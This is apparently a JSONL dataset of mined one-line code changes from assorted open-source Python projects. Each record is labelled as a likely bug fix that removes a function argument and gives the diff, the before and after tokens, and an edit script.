{"project": "osf.io", "commit_sha": "3bc9683ae26420df62dee07d2c5752bbc6583ae4", "parent_sha": "b8156948d66c4d84530fa3302af47bb5c34d4b49", "file_path": "osf_tests/test_node.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1736,7 +1736,7 @@ def test_can_comment():\n     noncontrib = UserFactory()\n     assert public_node.can_comment(Auth(noncontrib)) is True\n \n-    private_node = NodeFactory(is_public=False, public_comments=False)\n+    private_node = NodeFactory(is_public=False)\n     Contributor.objects.create(node=private_node, user=contrib, read=True)\n     assert private_node.can_comment(Auth(contrib)) is True\n     noncontrib = UserFactory()\n", "before": "private_node = NodeFactory ( is_public = False , public_comments = False )", "after": "private_node = NodeFactory ( is_public = False )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 47, 3, 48]], [\"Delete\", [\"identifier:public_comments\", 3, 49, 3, 64]], [\"Delete\", [\"=:=\", 3, 64, 3, 65]], [\"Delete\", [\"false:False\", 3, 65, 3, 70]], [\"Delete\", [\"keyword_argument\", 3, 49, 3, 70]]]"}
{"project": "osf.io", "commit_sha": "a4ee2b840b3af455049234e56382b37e86d33e1f", "parent_sha": "8e258aa9c5453a65bb98cb0a334326890dbcbb98", "file_path": "framework/auth/campaigns.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ def get_campaigns():\n \n         # Proxy campaigns: Preprints, both OSF and branded ones\n         try:\n-            preprint_providers = PreprintProvider.find(Q('_id', 'ne', None))\n+            preprint_providers = PreprintProvider.find()\n             for provider in preprint_providers:\n                 if provider._id == 'osf':\n                     template = 'osf'\n", "before": "preprint_providers = PreprintProvider . find ( Q ( '_id' , 'ne' , None ) )", "after": "preprint_providers = PreprintProvider . find ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\"argument_list\", 3, 55, 3, 77], [\"):)\", 3, 75, 3, 76], 1], [\"Delete\", [\"identifier:Q\", 3, 56, 3, 57]], [\"Delete\", [\"(:(\", 3, 57, 3, 58]], [\"Delete\", [\"string:'_id'\", 3, 58, 3, 63]], [\"Delete\", [\",:,\", 3, 63, 3, 64]], [\"Delete\", [\"string:'ne'\", 3, 65, 3, 69]], [\"Delete\", [\",:,\", 3, 69, 3, 70]], [\"Delete\", [\"none:None\", 3, 71, 3, 75]], [\"Delete\", [\"argument_list\", 3, 57, 3, 76]], [\"Delete\", [\"call\", 3, 56, 3, 76]], [\"Delete\", [\"):)\", 3, 76, 3, 77]]]"}
{"project": "osf.io", "commit_sha": "7735c016bf819c63462739f0736115ad93ee8e42", "parent_sha": "26336edd8a6ef48d2d6e4a4c7aad97e4cefb3e4a", "file_path": "osf_tests/test_node.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3537,7 +3537,7 @@ class TestTemplateNode:\n         assert new.is_registration is False\n \n     def test_cannot_template_deleted_registration(self, user, auth):\n-        registration = RegistrationFactory(creator=user, project=project, is_deleted=True)\n+        registration = RegistrationFactory(project=project, is_deleted=True)\n         new = registration.use_as_template(auth=auth)\n         assert not new.nodes\n         \n", "before": "registration = RegistrationFactory ( creator = user , project = project , is_deleted = True )", "after": "registration = RegistrationFactory ( project = project , is_deleted = True )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:creator\", 3, 44, 3, 51]], [\"Delete\", [\"=:=\", 3, 51, 3, 52]], [\"Delete\", [\"identifier:user\", 3, 52, 3, 56]], [\"Delete\", [\"keyword_argument\", 3, 44, 3, 56]], [\"Delete\", [\",:,\", 3, 56, 3, 57]]]"}
{"project": "osf.io", "commit_sha": "fa0927eb71024ce442ec6de0b04ef026d95e7947", "parent_sha": "3f8b423ee1fae724da28dd2842f2fd0edf72431e", "file_path": "api_tests/preprints/views/test_preprint_detail.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -922,7 +922,7 @@ class TestPreprintDetailPermissions:\n         assert res.json['data']['id'] == private_preprint._id\n \n     #   test_private_visible_to_write_contribs\n-        res = app.get(private_url, auth=write_contrib.auth, expect_errors=True)\n+        res = app.get(private_url, auth=write_contrib.auth)\n         assert res.status_code == 200\n \n     #   test_private_invisible_to_non_contribs\n", "before": "res = app . get ( private_url , auth = write_contrib . auth , expect_errors = True )", "after": "res = app . get ( private_url , auth = write_contrib . auth )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 59, 3, 60]], [\"Delete\", [\"identifier:expect_errors\", 3, 61, 3, 74]], [\"Delete\", [\"=:=\", 3, 74, 3, 75]], [\"Delete\", [\"true:True\", 3, 75, 3, 79]], [\"Delete\", [\"keyword_argument\", 3, 61, 3, 79]]]"}
{"project": "python-prompt-toolkit", "commit_sha": "3228e1c4c3373a167d4685288e29f316ab6bd8e2", "parent_sha": "e803f837bbf74e8861b984ed6381beb20354baf3", "file_path": "prompt_toolkit/key_binding/bindings/vi.py", "project_url": "https://github.com/melund/python-prompt-toolkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -398,7 +398,7 @@ def load_vi_bindings(registry, vi_state, filter=None):\n         event.cli.clipboard.set_text(text)\n \n     @handle('x', filter=selection_mode)\n-    @handle('d', 'd', filter=selection_mode)\n+    @handle('d', filter=selection_mode)\n     def _(event):\n", "before": "@ handle ( 'x' , filter = selection_mode ) @ handle ( 'd' , 'd' , filter = selection_mode ) def _ ( event ) : ", "after": "@ handle ( 'x' , filter = selection_mode ) @ handle ( 'd' , filter = selection_mode ) def _ ( event ) : ", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:'d'\", 3, 18, 3, 21]], [\"Delete\", [\",:,\", 3, 21, 3, 22]]]"}
{"project": "python-prompt-toolkit", "commit_sha": "4ef995693903804523908e4893ec569c2d57c9cc", "parent_sha": "da46350f9c0c4cb4f36fc43e5bc527700c687b62", "file_path": "prompt_toolkit/terminal/vt100_output.py", "project_url": "https://github.com/melund/python-prompt-toolkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -314,7 +314,7 @@ def _get_size(fileno):\n     buf = array.array(b'h' if six.PY2 else u'h', [0, 0, 0, 0])\n \n     # Do TIOCGWINSZ (Get)\n-    fcntl.ioctl(fileno, termios.TIOCGWINSZ, buf, True)\n+    fcntl.ioctl(fileno, termios.TIOCGWINSZ, buf)\n \n     # Return rows, cols\n     return buf[0], buf[1]\n", "before": "fcntl . ioctl ( fileno , termios . TIOCGWINSZ , buf , True )", "after": "fcntl . ioctl ( fileno , termios . TIOCGWINSZ , buf )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 48, 3, 49]], [\"Delete\", [\"true:True\", 3, 50, 3, 54]]]"}
{"project": "timekeeper_slack_bot", "commit_sha": "547ed62e092e0062390e842a639d580d2d6fa636", "parent_sha": "e56225d22de269820902401f8c8de436bf1c89e5", "file_path": "timekeeper.py", "project_url": "https://github.com/jshah59/timekeeper_slack_bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ def handle_command(command, channel):\n     response = None\n \n     if command.startswith(\"add_date\") or command.startswith(\"add_event\") or command.startswith(\"add_time\"):\n-        words = command.split(\" \")\n+        words = command.split()\n         if(len(words) is not 3):\n             response = \"Not sure what to do here. Try again with this format: 'add_date [event_name] [MM/DD/YYYY]' or 'add_date [MM/DD/YYY] [event_name]\"\n         else:\n", "before": "words = command . split ( \" \" )", "after": "words = command . split ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:\\\" \\\"\", 3, 31, 3, 34]]]"}
{"project": "python-github-api", "commit_sha": "19406775f21a368a9ee66254766643b47bf4630f", "parent_sha": "d3549341d740dd07ef7b4d2693b184e340e05885", "file_path": "Lib/pickle.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -519,7 +519,7 @@ class Unpickler:\n     dispatch[NONE] = load_none\n \n     def load_int(self):\n-        self.append(string.atoi(self.readline()[:-1], 0))\n+        self.append(string.atoi(self.readline()[:-1]))\n     dispatch[INT] = load_int\n \n     def load_binint(self):\n", "before": "self . append ( string . atoi ( self . readline ( ) [ : - 1 ] , 0 ) )", "after": "self . append ( string . atoi ( self . readline ( ) [ : - 1 ] ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 53, 3, 54]], [\"Delete\", [\"integer:0\", 3, 55, 3, 56]]]"}
{"project": "python-github-api", "commit_sha": "b4ec4b4189ee7be1e6b431a806e2b39e73b55d62", "parent_sha": "20b47a6a28d1c050088b5ce382671312fd69bc8b", "file_path": "Mac/Demo/quicktime/MovieInWindow.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ def main():\n \tQt.EnterMovies()\n \t\n \t# Get the movie file\n-\tfss, ok = macfs.StandardGetFile(QuickTime.MovieFileType)\n+\tfss, ok = macfs.StandardGetFile() # Was: QuickTime.MovieFileType\n \tif not ok:\n \t\tsys.exit(0)\n \t\t\n", "before": "fss , ok = macfs . StandardGetFile ( QuickTime . MovieFileType )", "after": "fss , ok = macfs . StandardGetFile ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:QuickTime\", 3, 34, 3, 43]], [\"Delete\", [\".:.\", 3, 43, 3, 44]], [\"Delete\", [\"identifier:MovieFileType\", 3, 44, 3, 57]], [\"Delete\", [\"attribute\", 3, 34, 3, 57]]]"}
{"project": "erpnext", "commit_sha": "afa14fc402779eaec72b33507962008b7944a80b", "parent_sha": "1765259043c64502dd1b06e94438bdd9df1f7a21", "file_path": "erpnext/accounts/doctype/payment_request/payment_request.py", "project_url": "https://github.com/indautgrp/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class PaymentRequest(Document):\n \t\tdata = frappe.db.get_value(self.reference_doctype, self.reference_name,\n \t\t\t[\"company\", \"customer_name\"], as_dict=1)\n \t\t\n-\t\tcontroller = get_integration_controller(self.payment_gateway, setup=False)\n+\t\tcontroller = get_integration_controller(self.payment_gateway)\n \t\tcontroller.validate_transaction_currency(self.currency)\n \t\t\n \t\treturn controller.get_payment_url(**{\n", "before": "controller = get_integration_controller ( self . payment_gateway , setup = False )", "after": "controller = get_integration_controller ( self . payment_gateway )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 63, 3, 64]], [\"Delete\", [\"identifier:setup\", 3, 65, 3, 70]], [\"Delete\", [\"=:=\", 3, 70, 3, 71]], [\"Delete\", [\"false:False\", 3, 71, 3, 76]], [\"Delete\", [\"keyword_argument\", 3, 65, 3, 76]]]"}
{"project": "erpnext", "commit_sha": "affc893aea2916174a90c73fb2f67746b85681e1", "parent_sha": "038c94a149acddb3dfa5e602769a494d212990b6", "file_path": "erpnext/hr/doctype/leave_allocation/leave_allocation.py", "project_url": "https://github.com/indautgrp/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class LeaveAllocation(Document):\n \t\t\n \t\tif flt(leaves_taken) > flt(self.total_leaves_allocated):\n \t\t\tif frappe.db.get_value(\"Leave Type\", self.leave_type, \"allow_negative\"):\n-\t\t\t\tfrappe.msgprint(_(\"Note: Total allocated leaves {0} shouldn't be less than already approved leaves {1} for the period\").format(self.total_leaves_allocated, leaves_taken), LessAllocationError)\n+\t\t\t\tfrappe.msgprint(_(\"Note: Total allocated leaves {0} shouldn't be less than already approved leaves {1} for the period\").format(self.total_leaves_allocated, leaves_taken))\n \t\t\telse:\n \t\t\t\tfrappe.throw(_(\"Total allocated leaves {0} cannot be less than already approved leaves {1} for the period\").format(self.total_leaves_allocated, leaves_taken), LessAllocationError)\n \n", "before": "frappe . msgprint ( _ ( \"Note: Total allocated leaves {0} shouldn't be less than already approved leaves {1} for the period\" ) . format ( self . total_leaves_allocated , leaves_taken ) , LessAllocationError )", "after": "frappe . msgprint ( _ ( \"Note: Total allocated leaves {0} shouldn't be less than already approved leaves {1} for the period\" ) . format ( self . total_leaves_allocated , leaves_taken ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 174, 3, 175]], [\"Delete\", [\"identifier:LessAllocationError\", 3, 176, 3, 195]]]"}
{"project": "python-github-api", "commit_sha": "4cf26773186a9a61f4258ff35b14371b4889c3de", "parent_sha": "a5b6c7f6b374f276f2295d2df896948ca4cfd9a7", "file_path": "Lib/markupbase.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -303,4 +303,4 @@ class ParserBase:\n             return string.lower(name), m.end()\n         else:\n             self.updatepos(declstartpos, i)\n-            self.error(\"expected name token\", self.getpos())\n+            self.error(\"expected name token\")\n", "before": "self . error ( \"expected name token\" , self . getpos ( ) )", "after": "self . error ( \"expected name token\" )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\"argument_list\", 3, 23, 3, 61], [\"):)\", 3, 59, 3, 60], 2], [\"Delete\", [\",:,\", 3, 45, 3, 46]], [\"Delete\", [\"identifier:self\", 3, 47, 3, 51]], [\"Delete\", [\".:.\", 3, 51, 3, 52]], [\"Delete\", [\"identifier:getpos\", 3, 52, 3, 58]], [\"Delete\", [\"attribute\", 3, 47, 3, 58]], [\"Delete\", [\"(:(\", 3, 58, 3, 59]], [\"Delete\", [\"argument_list\", 3, 58, 3, 60]], [\"Delete\", [\"call\", 3, 47, 3, 60]], [\"Delete\", [\"):)\", 3, 60, 3, 61]]]"}
{"project": "python-github-api", "commit_sha": "d72842065eaf5ffcc36608ed073f80830ceece83", "parent_sha": "e0114afc563582844a1164c6959f85abb7cdb092", "file_path": "Lib/SocketServer.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -570,7 +570,7 @@ class DatagramRequestHandler(BaseRequestHandler):\n         import StringIO\n         self.packet, self.socket = self.request\n         self.rfile = StringIO.StringIO(self.packet)\n-        self.wfile = StringIO.StringIO(self.packet)\n+        self.wfile = StringIO.StringIO()\n \n     def finish(self):\n         self.socket.sendto(self.wfile.getvalue(), self.client_address)\n", "before": "self . wfile = StringIO . StringIO ( self . packet )", "after": "self . wfile = StringIO . StringIO ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 40, 3, 44]], [\"Delete\", [\".:.\", 3, 44, 3, 45]], [\"Delete\", [\"identifier:packet\", 3, 45, 3, 51]], [\"Delete\", [\"attribute\", 3, 40, 3, 51]]]"}
{"project": "python-github-api", "commit_sha": "6f87b6053dafee4ce85b451e1df23f184685fe0d", "parent_sha": "455091db57aed01d9b33f0051a7b92e2da7b6dcd", "file_path": "Lib/os.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -580,7 +580,7 @@ if _exists(\"spawnvp\"):\n     # At the moment, Windows doesn't implement spawnvp[e],\n     # so it won't have spawnlp[e] either.\n     def spawnlp(mode, file, *args):\n-        \"\"\"spawnlp(mode, file, *args, env) -> integer\n+        \"\"\"spawnlp(mode, file, *args) -> integer\n \n Execute file (which is looked for along $PATH) with arguments from\n args in a subprocess with the supplied environment.\n", "before": "spawnlp ( mode , file , * args , env ) - > integer", "after": "spawnlp ( mode , file , * args ) - > integer", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 37, 3, 38]], [\"Delete\", [\"identifier:env\", 3, 39, 3, 42]]]"}
{"project": "gratipay.com", "commit_sha": "361877718712795fed7a4058ae0d99b492636122", "parent_sha": "1043e37e518d6d742f6da71fa6504c01b262d40c", "file_path": "tests/py/test_history.py", "project_url": "https://github.com/haonature/gratipay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class TestHistoryPage(Harness):\n \n     def test_admin_can_view_closed_participant_history(self):\n         self.make_exchange('braintree-cc', -30, 0, self.alice)\n-        self.alice.close(None)\n+        self.alice.close()\n \n         self.make_participant('bob', claimed_time='now', is_admin=True)\n         response = self.client.GET('/~alice/history/?year=%s' % self.past_year, auth_as='bob')\n", "before": "self . alice . close ( None )", "after": "self . alice . close ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"none:None\", 3, 26, 3, 30]]]"}
{"project": "python-github-api", "commit_sha": "b2b58c1a899746e6731ae852f68a69d69286372c", "parent_sha": "b5b216f3c60b5093df413f17d9a22785270f7d91", "file_path": "Tools/freeze/freeze.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -228,7 +228,7 @@ def main():\n         config_h_dir = exec_prefix\n         config_c_in = os.path.join(prefix, 'Modules', 'config.c.in')\n         frozenmain_c = os.path.join(prefix, 'Python', 'frozenmain.c')\n-        makefile_in = os.path.join(exec_prefix, 'Modules', 'Makefile')\n+        makefile_in = os.path.join(exec_prefix, 'Makefile')\n         if win:\n             frozendllmain_c = os.path.join(exec_prefix, 'Pc\\\\frozen_dllmain.c')\n", "before": "makefile_in = os . path . join ( exec_prefix , 'Modules' , 'Makefile' )", "after": "makefile_in = os . path . join ( exec_prefix , 'Makefile' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:'Modules'\", 3, 49, 3, 58]], [\"Delete\", [\",:,\", 3, 58, 3, 59]]]"}
{"project": "gratipay.com", "commit_sha": "bff153281122eade0e3653826f7fb76ad6e1e4e7", "parent_sha": "7a3a901a7a05bbadff02193c40e021e3b397f8c4", "file_path": "masspay.py", "project_url": "https://github.com/vemmaverve/gratipay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -175,7 +175,7 @@ def record_exchanges_in_gittip():\n \n     for username, email, gross, fee, net in csv.reader(open(GITTIP_CSV)):\n         url = '{}/{}/history/record-an-exchange'.format(gittip_base_url, username)\n-        note = 'PayPal MassPay to {}.'.format(gross, email)\n+        note = 'PayPal MassPay to {}.'.format(email)\n         data = {'amount': '-' + net, 'fee': fee, 'note': note}\n         requests.post(url, auth=(gittip_api_key, ''), data=data)\n         print(note)\n", "before": "note = 'PayPal MassPay to {}.' . format ( gross , email )", "after": "note = 'PayPal MassPay to {}.' . format ( email )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:gross\", 3, 47, 3, 52]], [\"Delete\", [\",:,\", 3, 52, 3, 53]]]"}
{"project": "erpnext", "commit_sha": "d98ca010824c344c1a6b6f2ce2cea0e66830ca46", "parent_sha": "3afecb9e30ab304e5fee005e594fadd1a7959f98", "file_path": "erpnext/stock/doctype/stock_ledger/stock_ledger.py", "project_url": "https://github.com/indautgrp/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -211,7 +211,7 @@ class DocType:\n \t\timport datetime\n \t\tfor d in getlist(obj.doclist, fname):\n \t\t\tif d.serial_no:\n-\t\t\t\tserial_nos = self.get_sr_no_list(d.serial_no, d.qty)\n+\t\t\t\tserial_nos = self.get_sr_no_list(d.serial_no)\n \t\t\t\tfor a in serial_nos:\n \t\t\t\t\tserial_no = a.strip()\n \t\t\t\t\tif is_incoming:\n", "before": "serial_nos = self . get_sr_no_list ( d . serial_no , d . qty )", "after": "serial_nos = self . get_sr_no_list ( d . serial_no )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 49, 3, 50]], [\"Delete\", [\"identifier:d\", 3, 51, 3, 52]], [\"Delete\", [\".:.\", 3, 52, 3, 53]], [\"Delete\", [\"identifier:qty\", 3, 53, 3, 56]], [\"Delete\", [\"attribute\", 3, 51, 3, 56]]]"}
{"project": "erpnext", "commit_sha": "0fabc6a84106e707bdf38e00a2cf6e8e59287eb3", "parent_sha": "2a45e1cfd0a1519a14a0ee3d23e3c49575806440", "file_path": "erpnext/buying/doctype/quality_inspection/quality_inspection.py", "project_url": "https://github.com/indautgrp/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ def item_query(doctype, txt, searchfield, start, page_len, filters):\n \t\tfrom frappe.widgets.reportview import get_match_cond\n \t\tfilters.update({\n \t\t\t\"txt\": txt,\n-\t\t\t\"mcond\": get_match_cond(filters[\"from\"], searchfield),\n+\t\t\t\"mcond\": get_match_cond(filters[\"from\"]),\n \t\t\t\"start\": start,\n \t\t\t\"page_len\": page_len\n \t\t})\n", "before": "filters . update ( { \"txt\" : txt , \"mcond\" : get_match_cond ( filters [ \"from\" ] , searchfield ) , \"start\" : start , \"page_len\" : page_len } )", "after": "filters . update ( { \"txt\" : txt , \"mcond\" : get_match_cond ( filters [ \"from\" ] ) , \"start\" : start , \"page_len\" : page_len } )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 43, 3, 44]], [\"Delete\", [\"identifier:searchfield\", 3, 45, 3, 56]]]"}
{"project": "asterisk-testsuite", "commit_sha": "986de222432ef3e3e6c9e5d7318c11c995b5fe59", "parent_sha": "bc4eb8dfcd4dc61058f2e26dc1816516ebcff7aa", "file_path": "lib/python/asterisk/TestCase.py", "project_url": "https://github.com/auntieNeo/asterisk-testsuite", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class TestCase(object):\n         \"\"\" Set up logging \"\"\"\n         logConfigFile = os.path.join(os.getcwd(), \"%s\" % (self.defaultLogFileName))\n         if os.path.exists(logConfigFile):\n-            logging.config.fileConfig(logConfigFile, None, False)\n+            logging.config.fileConfig(logConfigFile)\n         else:\n             print \"WARNING: no logging.conf file found; using default configuration\"\n             logging.basicConfig(level=self.defaultLogLevel)\n", "before": "logging . config . fileConfig ( logConfigFile , None , False )", "after": "logging . config . fileConfig ( logConfigFile )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 52, 3, 53]], [\"Delete\", [\"none:None\", 3, 54, 3, 58]], [\"Delete\", [\",:,\", 3, 58, 3, 59]], [\"Delete\", [\"false:False\", 3, 60, 3, 65]]]"}
{"project": "mustikkaBot", "commit_sha": "f9a3a239ac026835cab4a1dbdd82257781db4fe8", "parent_sha": "443fde7bd257d446a3b9de9be1ec0b78fde4d51b", "file_path": "src/modules/commands.py", "project_url": "https://github.com/varesa/mustikkaBot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ class Commands:\n         self.read_JSON()\n \n         for command in self.commands:\n-            bot.accessmanager.register_acl(\"commands.!\" + command['name'], \"%moderators%\", \"\")\n+            bot.accessmanager.register_acl(\"commands.!\" + command['name'])\n \n         bot.eventmanager.register_message(self)\n         self.log.info(\"Init complete\")\n", "before": "bot . accessmanager . register_acl ( \"commands.!\" + command [ 'name' ] , \"%moderators%\" , \"\" )", "after": "bot . accessmanager . register_acl ( \"commands.!\" + command [ 'name' ] )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 74, 3, 75]], [\"Delete\", [\"string:\\\"%moderators%\\\"\", 3, 76, 3, 90]], [\"Delete\", [\",:,\", 3, 90, 3, 91]], [\"Delete\", [\"string:\\\"\\\"\", 3, 92, 3, 94]]]"}
{"project": "OpenBazaar", "commit_sha": "dbb35f7df03fbd84079d986aada9cb132b8e2d35", "parent_sha": "436aee5dfad25279e40b2dd1b3ad5b24c9a6cae9", "file_path": "node/p2p.py", "project_url": "https://github.com/roguesupport/OpenBazaar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ class PeerConnection(object):\n                     self._log.debug('%s' % msg)\n                     callback(msg)\n \n-                self._stream.close(0)\n+                self._stream.close()\n                 self._socket.close(0)\n \n             self._stream.on_recv(cb)\n", "before": "self . _stream . close ( 0 )", "after": "self . _stream . close ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"integer:0\", 3, 36, 3, 37]]]"}
{"project": "OpenBazaar", "commit_sha": "2dccb5d67aa63652e88cb60b21175b9669c9f179", "parent_sha": "c1e821d9c10c561a50e3c95cd22b9e060df1b881", "file_path": "node/p2p.py", "project_url": "https://github.com/roguesupport/OpenBazaar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ class PeerConnection(object):\n                     self._log.debug('%s' % msg)\n                     callback(msg)\n \n-                self._stream.close(0)\n+                self._stream.close()\n                 self._socket.close(0)\n \n             self._stream.on_recv(cb)\n", "before": "self . _stream . close ( 0 )", "after": "self . _stream . close ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"integer:0\", 3, 36, 3, 37]]]"}
{"project": "OpenBazaar", "commit_sha": "d03f17798a742ef44574a3151f93d75e49494695", "parent_sha": "4caf35c10541d0cc58485c6f0095e77c42252cfe", "file_path": "node/connection.py", "project_url": "https://github.com/roguesupport/OpenBazaar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -162,7 +162,7 @@ class PeerConnection(GUIDMixin, object):\n         for x in self.transport.dht.active_peers:\n             if x.hostname == 'seed2.openbazaar.org' or x.hostname == '205.186.156.31':\n                 self.sock.sendto('send_relay_ping %s' % self.guid, (x.hostname, x.port))\n-                count_outgoing_packet('send_relay_ping %s' % self.guid, (x.hostname, x.port))\n+                count_outgoing_packet('send_relay_ping %s' % self.guid)\n         return True\n \n     def init_packetsender(self):\n", "before": "count_outgoing_packet ( 'send_relay_ping %s' % self . guid , ( x . hostname , x . port ) )", "after": "count_outgoing_packet ( 'send_relay_ping %s' % self . guid )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\"argument_list\", 3, 38, 3, 94], [\"):)\", 3, 92, 3, 93], 2], [\"Delete\", [\",:,\", 3, 71, 3, 72]], [\"Delete\", [\"(:(\", 3, 73, 3, 74]], [\"Delete\", [\"identifier:x\", 3, 74, 3, 75]], [\"Delete\", [\".:.\", 3, 75, 3, 76]], [\"Delete\", [\"identifier:hostname\", 3, 76, 3, 84]], [\"Delete\", [\"attribute\", 3, 74, 3, 84]], [\"Delete\", [\",:,\", 3, 84, 3, 85]], [\"Delete\", [\"identifier:x\", 3, 86, 3, 87]], [\"Delete\", [\".:.\", 3, 87, 3, 88]], [\"Delete\", [\"identifier:port\", 3, 88, 3, 92]], [\"Delete\", [\"attribute\", 3, 86, 3, 92]], [\"Delete\", [\"tuple\", 3, 73, 3, 93]], [\"Delete\", [\"):)\", 3, 93, 3, 94]]]"}
{"project": "goagent", "commit_sha": "c783b20571cfeca9311e7ff673f533db8a5f52d3", "parent_sha": "78b354d33945ac255abfc52ddc414a9a906e23e7", "file_path": "local/proxy.py", "project_url": "https://github.com/search-cloud/goagent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -398,7 +398,7 @@ class CertUtil(object):\n                 else:\n                     os.remove(certdir)\n                     os.mkdir(certdir)\n-            CertUtil.dump_ca(CertUtil.ca_keyfile)\n+            CertUtil.dump_ca()\n         if glob.glob('%s/*.key' % CertUtil.ca_certdir):\n             for filename in glob.glob('%s/*.key' % CertUtil.ca_certdir):\n                 try:\n", "before": "CertUtil . dump_ca ( CertUtil . ca_keyfile )", "after": "CertUtil . dump_ca ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:CertUtil\", 3, 30, 3, 38]], [\"Delete\", [\".:.\", 3, 38, 3, 39]], [\"Delete\", [\"identifier:ca_keyfile\", 3, 39, 3, 49]], [\"Delete\", [\"attribute\", 3, 30, 3, 49]]]"}
{"project": "DropboxInstaller", "commit_sha": "5e1c50c745a1b7d4d9cd7c7656a0e776e16bcb25", "parent_sha": "021f9370b847d69db1a122d6f6d75983ba5710f5", "file_path": "DropboxInstaller.py", "project_url": "https://github.com/csoliss/DropboxInstaller", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ class Linux_Cmd():\n         _cmd = _cmd.split()\n         if self._MyOS == 'ubuntu':\n             _cmd.insert(0, self._sudo)\n-        subprocess.Popen(_cmd, shell=True)\n+        subprocess.Popen(_cmd)\n \n     def check_pgk(self, _package):\n         if self._MyOS == 'ubuntu' or self._MyOS == 'debian':\n", "before": "subprocess . Popen ( _cmd , shell = True )", "after": "subprocess . Popen ( _cmd )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 30, 3, 31]], [\"Delete\", [\"identifier:shell\", 3, 32, 3, 37]], [\"Delete\", [\"=:=\", 3, 37, 3, 38]], [\"Delete\", [\"true:True\", 3, 38, 3, 42]], [\"Delete\", [\"keyword_argument\", 3, 32, 3, 42]]]"}
